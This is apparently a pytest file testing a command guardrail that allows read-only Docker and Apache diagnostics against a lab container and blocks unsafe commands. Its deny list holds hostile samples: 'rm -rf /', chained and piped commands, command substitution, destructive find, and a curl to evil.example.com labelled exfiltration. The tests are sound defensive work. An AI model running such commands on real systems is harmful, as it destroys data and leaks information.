"""Unit tests for the guardrail. Run: pytest -q"""

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from safety import check_command  # noqa: E402

ALLOWED = [
    "docker ps",
    "docker logs --tail 100 lab-server",
    "docker inspect lab-server",
    "docker exec lab-server apachectl -t",
    "docker exec lab-server apachectl -S",
    "docker exec lab-server apache2ctl configtest",
    "docker exec lab-server ps aux",
    "docker exec lab-server ss -ltnp",
    "docker exec lab-server cat /etc/apache2/apache2.conf",
    "docker exec lab-server ls -l /var/www/html",
    "docker exec lab-server tail -n 50 /var/log/apache2/error.log",
    "docker exec lab-server curl -sI http://localhost",
    "docker exec lab-server grep -n DocumentRoot /etc/apache2/sites-enabled/000-default.conf",
]

DENIED = [
    "rm -rf /",                                              # not docker
    "docker exec lab-server rm -rf /var/www",                # rm not allowed
    "docker exec lab-server apachectl",                      # no args
    "docker exec lab-server apachectl -k start",             # changes state
    "docker exec lab-server apachectl graceful",             # changes state
    "docker exec lab-server apache2ctl restart",             # changes state
    "docker exec lab-server cat /etc/passwd; rm -rf /",      # chaining
    "docker exec lab-server cat /etc/apache2/apache2.conf | sh",  # pipe
    "docker exec lab-server cat $(whoami)",                  # substitution
    "docker exec lab-server find / -delete",                 # destructive find
    "docker exec lab-server find /etc -exec rm {} +",        # find -exec
    "docker exec lab-server tail -f /var/log/apache2/error.log",  # hangs
    "docker exec lab-server curl http://evil.example.com",   # exfiltration
    "docker exec lab-server curl -o /tmp/x http://localhost",  # writes file
    "docker exec -u root lab-server ps",                     # extra docker flags
    "docker exec other-container ps",                        # wrong target
    "docker run --privileged ubuntu",                        # not allowed subcommand
    "docker rm -f lab-server",                               # destructive
    "docker logs -f lab-server",                             # hangs
    "docker exec lab-server ls /etc/*.conf",                 # glob
    "",                                                      # empty
]


@pytest.mark.parametrize("command", ALLOWED)
def test_allowed(command: str) -> None:
    decision = check_command(command)
    assert decision.allowed, decision.reason


@pytest.mark.parametrize("command", DENIED)
def test_denied(command: str) -> None:
    assert not check_command(command).allowed
